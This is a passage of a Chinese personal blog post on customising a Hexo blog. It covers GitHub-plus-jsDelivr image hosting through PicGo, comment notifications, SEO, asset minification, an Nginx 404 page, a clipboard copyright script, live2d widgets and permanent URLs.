文章缩略图无法设置</h4><p>文章缩略图<code>cover</code>使用上面的方式进行设置，发现并没有什么用，想了好久也没想到能使用本地图片的方法，无奈只能选择以图床的方式添加缩略图。</p><p>浏览了互联网整个浩瀚的海洋，发现了几个比较有名的图床，腾讯云COS，微博图床，七牛云，阿里云OSS，又拍云，网易云NOS，<a href="http://sm.ms">sm.ms</a>，Imgur，GitHub等等，经过多方面的调查比较，发现这些图床并不符合我想要的，要么收费、要么需要域名备案、要么稳定性没有绝对的保障。</p><p>后来在我使用的主题的作者jerryc的博客里发现他使用的是jsDelivr作为CDN加速提供图片外链，经过查阅资料得知，这种方式的主要思路是使用GitHub作为图片存储，使用jsDelivr作为GitHub的CDN加速，将静态文件缓存在jsDelivr的CDN节点上，最后获得加速后的图片url</p><p>首先要<a href="https://github.com/new">创建一个GitHub仓库</a>，并起一个仓库名，公开仓库即可</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564887053051.png" alt="1564887053051"></p><p>然后在GitHub中<a href="https://github.com/settings/tokens/new">获取一个token</a>（它可以让程序拥有控制仓库的权限）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564886509572.png" alt="1564886509572"></p><p>然后设置一个Note作为token的标记，下面的选项只把repo打钩即可</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564886631396.png" alt="1564886631396"></p><p>之后网页滑到最下面，<code>Generate token</code>生成token，并复制，记住这个token只显示一次，如果不慎把网页关闭，就只能重新生成一次token了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564886774195.png" alt="1564886774195"></p><p>然后我们下载一个图片上传工具，在这里我们使用PicGo（<a href="https://github.com/Molunerfinn/PicGo/releases">点击下载</a>），下载完后安装打开，在图床设置处配置GitHub图床</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564886888829.png" alt="1564886888829"></p><ol><li><p>设定仓库名：填写上面创建的仓库，格式为<code>用户名/仓库名</code>；</p></li><li><p>设定分支名：一般默认填<code>master</code>即可；</p></li><li><p>设定token：将上面生成的token粘贴进去；</p></li><li><p>指定存储路径：想把图片放到仓库的哪个位置就设置哪个路径，比如<code>img/</code>，注意文件夹的后面一定要带 <code>/</code>否则会被当做文件处理；</p></li><li><p>设置自定义域名： 这里我的设置是</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>gh</code>表示来自于GitHub仓库</li><li><code>BayMRX/Blog_source</code>表示仓库名</li><li><code>master</code>是仓库的分支</li></ul><p>配置完成，确定保存即可。</p><p>然后就可以通过PicGo方便地上传图片了，它支持拖拽、点击、剪贴板上传，上传后，图片链接会直接复制到剪贴板中。</p><blockquote><p>需要注意的地方：</p><p>这里创建GitHub仓库的时候，不能创建私人仓库，否则会无法连接，提示</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564889442772.png" alt="1564889442772"></p><p>所以创建的时候要创建公开仓库。</p></blockquote><h2 id="主题再创作——在原有主题上再添加一些功能">主题再创作——在原有主题上再添加一些功能</h2><h4 id="Valine评论系统">Valine评论系统</h4><p>评论系统是搭建好了，测试也可以正常使用，就是如果有什么人对我的文章进行评论了的话，我也不知道啊。一番搜索找到了解决办法，Valine评论系统是基于 Leancloud的云引擎与云函数，可以提供邮件通知的服务。</p><p>在这里找到了一篇文章供作参考：<a href="http://www.zhaojun.im/hexo-valine-modify/">Hexo 优化 — 支持邮件通知的评论 Valine 增强版</a></p><p>★★<code>2020-06-18</code>更新：最近官方对于LeanCloud服务器的唤醒进行了限制，没法使用重发函数对服务器进行唤醒，导致无法正常使用邮件提醒服务。查看日志它会提示&quot;因流控原因，通过定时任务唤醒体验版实例失败，建议升级至标准版云引擎实例避免休眠&quot;。去网上查找资料，发现还是有解决办法的，参考小康大佬的博客：<a href="https://www.antmoe.com/posts/ff6aef7b/index.html">优雅解决 LeanCloud 流控问题</a></p><p>这里我使用的是大佬的<a href="https://www.antmoe.com/posts/ff6aef7b/index.html#%E6%96%B9%E6%A1%88%E5%9B%9B">方案四</a>解决的，唤醒计划依然是每20分钟一次。</p><h4 id="提交网站到搜索引擎（SEO优化）">提交网站到搜索引擎（SEO优化）</h4><p>在我们刚建立好网站时，搜索引擎无法检索到我们的网站。可以在搜索引擎中输入<code>site:&lt;域名&gt;</code>来查看网站是否已被搜索引擎收录。感谢<a href="https://luanzhuxian.github.io/post/82d92ad4.html">Hexo + Next 主题博客提交百度谷歌收录</a>提供教程参考。</p><h5 id="1-验证站点">1. 验证站点</h5><p>有三种验证方式，文件验证、html 标签验证、cname 解析验证。可参考<a href="https://jerryc.me/posts/21cfbf15/#%E7%B6%B2%E7%AB%99%E9%A9%97%E8%AD%89">网站验证</a></p><h5 id="2-生成sitemap站点地图并提交">2. 生成sitemap站点地图并提交</h5><p><a href="https://www.google.com/webmasters/#?modal_active=none">Google</a></p><p><a href="https://ziyuan.baidu.com/dashboard/index">Baidu</a></p><h5 id="3-静态资源压缩优化">3.静态资源压缩优化</h5><p>对于个人博客，访问速度的优化是很有必要的，当然访问速度越快越有利于搜索引擎排名的靠前。所以要想提高博客的页面加载速度。可以考虑对页面的静态资源进行压缩，我们自己生成的html、css和js文件，为了可读性会有很多换行和空格，这对浏览器来说会降低页面渲染的速度。</p><p>安装hexo-neat插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-neat --save</span><br></pre></td></tr></table></figure><p>在配置文件<code>_config.yml</code>中添加配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo-neat</span></span><br><span class="line"><span class="comment"># 博文压缩</span></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># 压缩html</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line"><span class="comment"># 压缩css  </span></span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.css&#x27;</span></span><br><span class="line"><span class="comment"># 压缩js</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/jquery.fancybox.pack.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/index.js&#x27;</span>  </span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/main.js&#x27;</span></span><br></pre></td></tr></table></figure><p>有些js或css文件压缩后可能会失效，如果发现页面某些功能不正常或者无法生成静态页面文件，可以配置跳过压缩对应的文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.js&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="添加404页面">添加404页面</h4><p>尝试过网上介绍的办法，直接 <code>hexo new page 404</code>生成404页面不能正确跳转到自己定义的404页面，而是跳转到服务器默认的白色404页面</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564830381908.png" alt=""></p><p>再次百思不得其解，又是一波疯狂的查阅资料，发现是Nginx的问题，需要对Nginx进行配置才能正确跳转到自定义的404页面</p><p>首先我们要建立一个<code>404.html</code>文件在博客根目录下的<code>/source</code>文件夹中</p><p>网页的内容这里我是用腾讯的404公益页面，也算是行善了吧，当然也可以把页面设计成自己想要的任何亚子</p><p>在这里附上调用腾讯404公益页面的网页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found!<span class="tag">&lt;/<span class="name">title</span>&gt;</span>                                                                                                                                        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="attr">homePageName</span>=<span class="string">&quot;返回我的首页&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;http://baymrx.me&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果这样使用hexo直接生成部署，这个html也会被按照主题样式被渲染，所以这里我们要跳过渲染，修改根目录下的配置文件<code>_config.yml</code>，在<code>skip_render</code>的后面添加<code>404.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip_render: 404.html</span><br></pre></td></tr></table></figure><p>如果有多项需要跳过渲染的文件，用 <code>-</code> 隔开。</p><p>然后我们需要在服务器端配置Nginx</p><p>先SSH连接登陆到远端服务器，然后修改Nginx的配置文件<code>nginx.conf</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>在http的定义区域添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_intercept_errors on;</span><br></pre></td></tr></table></figure><p>添加完后保存更改，随后再更改站点配置文件，继续更改<code>nginx.conf</code>，我这里是<code>sites-enabled</code>下的单独网站配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/sites-enabled/default </span><br></pre></td></tr></table></figure><p>在<code>server</code>区域中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_page 404 = /404.html;</span><br></pre></td></tr></table></figure><p>更改完成后保存，重启Nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><p>浏览器访问一个不存在的页面，如<a href="http://baymrx.me/qaq">baymrx.me/qaq</a>，便可看到设定的404页面</p><h4 id="文章复制添加版权小尾巴">文章复制添加版权小尾巴</h4><p>我们借助于主题，已经把文章末尾加上了版权说明信息</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1564844695079.png" alt="1564844695079"></p><p><s>但是加上这个似乎并没有什么卵用，我们在访问别人的博客时，比如CSDN这一类，如果要从他们的博客里面复制一些文字，粘贴出来总会带有作者版权的小尾巴，那么在Hexo里面怎么实现这个功能呢。又是一波疯狂的资料查阅，发现网上大部分的功能修改都是基于ejs和swig模板引擎的主题，而我使用的Butterfly主题是用的pug模板引擎，这就造成了不能通过直接添加文件的大麻烦。</s></p><p>(2020.1.10更新)这里添加版权小尾巴在最新版本的主题中已经可以实现了，并且可以自由开启和关闭文章的复制功能，修改主题配置文件中对应的设置即可实现：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># copy setting</span></span><br><span class="line"><span class="comment"># 是否禁止複製（如果禁止，highlight_copy的功能將無效)</span></span><br><span class="line"><span class="comment"># copyright 複製的内容後面加上版權信息</span></span><br><span class="line"><span class="attr">copy:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment"># true 開啓 / false 禁止</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><s>既然不能直接添加，那么就自己进行移植，在了解了一丢丢pug的语法之后，发现可以通过在pug文件中嵌入js脚本文件来实现</s></p><p><s>—正片开始—</s></p><p><s>首先在主题根目录的<code>Butterfly/source/js</code>文件夹中新建一个js文件<code>copy_right.js</code>，内容为</s></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> b, c;</span><br><span class="line">        <span class="keyword">if</span> (a.<span class="title function_">preventDefault</span>(), b = <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">toString</span>() + <span class="string">&quot;&lt;br&gt;&lt;br&gt;本文采用 CC BY-NC-SA 4.0 许可协议，著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&lt;br&gt;作者：BayMRX&lt;br&gt;来源：&quot;</span> + <span class="variable language_">document</span>.<span class="property">title</span> + <span class="string">&quot;&lt;br&gt;链接：&quot;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>, c = <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">toString</span>() + <span class="string">&quot;\n\n本文采用 CC BY-NC-SA 4.0 许可协议，著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n作者：BayMRX\n来源：&quot;</span> + <span class="variable language_">document</span>.<span class="property">title</span> + <span class="string">&quot;\n链接：&quot;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>, a.<span class="property">clipboardData</span>) </span><br><span class="line">            a.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&quot;text/html&quot;</span>, b), a.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&quot;text/plain&quot;</span>, c);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">clipboardData</span>) <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&quot;text&quot;</span>, c)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;copy&quot;</span>, <span class="keyword">function</span>(<span class="params">b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sn = <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="property">anchorNode</span>.<span class="property">parentNode</span>.<span class="property">nodeName</span>;</span><br><span class="line">    (sn !== <span class="string">&#x27;CODE&#x27;</span> &amp;&amp; sn !== <span class="string">&#x27;SPAN&#x27;</span>) &amp;&amp; <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">toString</span>().<span class="property">length</span> &gt; <span class="number">10</span> &amp;&amp; <span class="title function_">a</span>(b)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><p><s>然后要修改我们的pug文件。进入到<code>Butterfly/layout</code>目录，找到<code>post.pug</code>文件用记事本或者Notepad++等编辑器打开，找到<code>block content</code>这个块，在下面的<code>if语句</code>的最后添加一句</s></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script(src=&#x27;/js/copy_right.js&#x27;)</span><br></pre></td></tr></table></figure><p><s>最终代码</s></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if (theme.post_copyright &amp;&amp; theme.post_copyright.enable)</span><br><span class="line">    .post-copyright</span><br><span class="line">      .post-copyright__author</span><br><span class="line">        span.post-copyright-meta= _p(&#x27;post.copyright.author&#x27;) + &quot;: &quot;</span><br><span class="line">        span.post-copyright-info</span><br><span class="line">          a(href=`mailto:$&#123;config.email&#125;`) #[=config.author]</span><br><span class="line">      .post-copyright__type</span><br><span class="line">        span.post-copyright-meta= _p(&#x27;post.copyright.link&#x27;) + &quot;: &quot;</span><br><span class="line">        span.post-copyright-info</span><br><span class="line">          a(href=url_for(page.permalink)) #[=page.permalink]</span><br><span class="line">      .post-copyright__notice</span><br><span class="line">        span.post-copyright-meta= _p(&#x27;post.copyright.copyright_notice&#x27;) + &quot;: &quot;</span><br><span class="line">        span.post-copyright-info!= _p(&#x27;post.copyright.copyright_content&#x27;, theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)</span><br><span class="line">    script(src=&#x27;/js/copy_right.js&#x27;)</span><br></pre></td></tr></table></figure><p><s>刚加的语句是在if下面，一定要注意好缩进关系！！！</s></p><p><s>然后<code>hexo clean &amp;&amp; hexo g -d</code>生成部署，打开自己的一篇文档复制粘贴，然后就会惊奇的发现多了小尾巴</s>~~</p><p><s>灰常感谢<a href="https://blog.meow.page/2019/04/05/add-little-tail-of-copyright-to-hexo/">驱蚊器喵#ΦωΦ</a>提供技术参考</s></p><hr><hr><p>分割线o(￣ヘ￣o＃)</p><hr><hr><p>以下内容为待完成，会持续更新……<a href="https://segmentfault.com/a/1190000009544924#articleHeader3">参考链接</a></p><p><a href="https://blinkfox.github.io/2018/09/28/qian-duan/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/">另一个比较优秀的主题matery——闪烁之狐</a></p><h4 id="添加live-2D（看板娘）">添加live 2D（看板娘）</h4><h5 id="1-安装">1.安装</h5><p>进入Hexo根目录安装live2d插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>然后安装live2d模型，使用<code>npm install &#123;packagename&#125;</code>进行安装，模型的包名将会在<code>packages/</code>中以文件夹形式存在，现有的模型有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru/01 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haru/02 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure><p><a href="https://huaji8.top/post/live2d-plugin-2.0/">live2D模型预览查看</a></p><h5 id="2-配置">2.配置</h5><p>修改根目录下的<code>_config.yml</code>文件，添加自定义配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># enable: false</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span> <span class="comment"># 默认</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span> <span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span> <span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span> <span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span> <span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span> <span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-shizuku</span>  <span class="comment">#你所安装的模板的名称</span></span><br><span class="line">    <span class="attr">scale:</span> <span class="number">1</span>   <span class="comment">#模型与canvas的缩放比例，1为正常比例</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">superSample:</span> <span class="number">2</span>  <span class="comment">#超采样等级</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span>   <span class="comment">#canvas的长度/宽度</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span>   <span class="comment">#canvas的高度</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span>  <span class="comment">#可以选择left/right 显示位置左或者右</span></span><br><span class="line">    <span class="attr">hOffset:</span> <span class="number">30</span>    <span class="comment">#水平偏移</span></span><br><span class="line">    <span class="attr">vOffset:</span> <span class="number">-20</span>   <span class="comment">#竖直偏移</span></span><br><span class="line">  <span class="attr">mobile:</span> </span><br><span class="line">    <span class="attr">show:</span> <span class="literal">false</span>   <span class="comment">#true/fasle 是否在移动设备上显示</span></span><br><span class="line">    <span class="attr">scale:</span> <span class="number">0.5</span>    <span class="comment">#在移动设备上面的缩放比例，1为正常比例</span></span><br><span class="line">  <span class="attr">name:</span> </span><br><span class="line">    <span class="attr">canvas:</span> <span class="string">live2dcanvas</span>    <span class="comment">#canvas元素的ID</span></span><br><span class="line">    <span class="attr">div:</span> <span class="string">live2d-widget</span>    <span class="comment">#div元素的ID</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacityDefault:</span> <span class="number">0.7</span></span><br><span class="line">    <span class="attr">opacityOnHover:</span> <span class="number">0.2</span>    <span class="comment">#透明度，1是完全不透明，0表示完全透明</span></span><br><span class="line">  <span class="attr">dev:</span> </span><br><span class="line">    <span class="attr">border:</span> <span class="literal">false</span>   <span class="comment">#true/false 是否在canvas的周围显示边界</span></span><br><span class="line">  <span class="attr">dialog:</span> </span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>     <span class="comment">#true/false 是否显示人物对话框</span></span><br><span class="line">    <span class="attr">hitokoto:</span> <span class="literal">true</span>    <span class="comment">#true/false  是否使用一言API</span></span><br></pre></td></tr></table></figure><h5 id="3-生成博客">3. 生成博客</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><h4 id="设置永久化URL">设置永久化URL</h4><p>Hexo 默认文章链接生成规则是按照年、月、日、标题来生成的。一旦文章标题或者发布时间被修改，URL 就会发生变化，之前文章地址也会变成 404，而且 URL 层级很深，不利于分享和搜索引擎收录。</p><p>如果文章标题中有中文，URL 被转码后会很长。。</p><p>Hexo有一个插件<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a>会为每一篇博客生成唯一的ID作为博客的唯一链接，不会受标题和文章内容改变的影响</p><h5 id="1-安装-2">1.安装</h5><p>使用npm命令直接安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><h5 id="2-配置-2">2.配置</h5><p>修改博客根目录的<code>_config.yml</code>文件的<code>permalink</code>，并添加<code>abbrlink</code>选项：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="comment"># permalink_defaults:</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>  <span class="comment"># 算法：crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>    <span class="comment"># 进制：dec(default) and hex</span></span><br></pre></td></tr></table></figure><p>其中<code>permalink</code>中的<code>posts</code>是自定义的目录，后面为固定格式，添加<code>.html</code>后缀是为了方便搜索引擎检索。下面的<code>abbrlink</code>选项是永久链的计算方法与进制，默认即可。</p><h5 id="3-验证">3.验证</h5><p>使用<code>hexo clean</code>清理本地文件，然后重新生成，在博客的<code>md</code>文件中就可以看到<code>abbrlink</code>内容：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abbrlink: 87613c70</span><br></pre></td></tr></table></figure><p>这一串字符串就会作为博客的唯一标识出现在博客的URL中。</p><h4 id="将博客同步部署到GitHub-Pages">将博客同步部署到GitHub Pages</h4><p>已填坑，详见：<a href="http://baymrx.me/2020/05/27/%E4%BD%BF%E7%94%A8Hexo-GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">使用Hexo+GitHub搭建自己的个人博客</a></p><ul><li><p><a href="http://yangbingdong.com/2017/build-blog-hexo-base/">基于Hexo+github+coding搭建个人博客——基础篇(从菜鸟到放弃)</a></p></li><li><p><a href="http://yangbingdong.com/2017/build-blog-hexo-advanced/">基于Hexo搭建个人博客——进阶篇(从入门到入土)</a></p></li><li><p><a 